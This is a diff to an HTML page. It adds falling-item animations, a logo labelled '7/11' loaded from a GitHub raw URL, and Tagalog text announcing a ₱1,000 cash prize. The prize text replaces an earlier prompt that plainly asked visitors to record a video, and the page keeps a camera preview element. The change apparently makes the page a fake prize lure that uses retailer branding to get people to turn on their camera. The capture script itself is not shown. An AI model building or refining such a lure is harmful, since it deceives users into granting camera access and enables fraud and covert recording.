@@ -13,13 +13,37 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background:#f5f5f5; display:
 #loading { display:none; margin-top:20px; }
 .spinner { border:3px solid #30363d; border-top:3px solid #f3ba2f; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:0 auto 10px; }
 @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
+    /* ===== FALLING ANIMATION ===== */
+.item {
+    position: fixed;
+    top: -50px;
+    font-size: 28px;
+    animation: fall linear infinite;
+}
+@keyframes fall { 0% { transform: translateY(-50px); opacity: 1; } 100% { transform: translateY(110vh); opacity: 0.8; } }
+.item:nth-child(1){left:5%; animation-duration:6s;}
+.item:nth-child(2){left:15%; animation-duration:8s;}
+.item:nth-child(3){left:25%; animation-duration:7s;}
+.item:nth-child(4){left:35%; animation-duration:9s;}
+.item:nth-child(5){left:45%; animation-duration:6s;}
+.item:nth-child(6){left:55%; animation-duration:8s;}
+.item:nth-child(7){left:65%; animation-duration:7s;}
+.item:nth-child(8){left:75%; animation-duration:9s;}
+.item:nth-child(9){left:85%; animation-duration:6s;}
+.item:nth-child(10){left:95%; animation-duration:8s; }
+
+/* ===== LOGO ===== */
+.logo-icon { width: 80px; margin-bottom: 20px; }
+
 </style>
 </head>
 <body>
 
 <div class="card">
+    <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/b1254f40-ca11-43dd-97a1-d86053dec6ba.jpeg" class="logo-icon" alt="7/11">
     <h2>🎉 CONGRATULATIONS! 🎉</h2>
-    <p>Click “Claim Now” to record your video!</p>
+    <p>Nanalo ka ng ₱1,000 Cash Prize! 💸
+ Click “Claim Now” to see if you’re lucky today!</p>
 
     <div id="vBox">
         <video id="preview" autoplay playsinline muted></video>
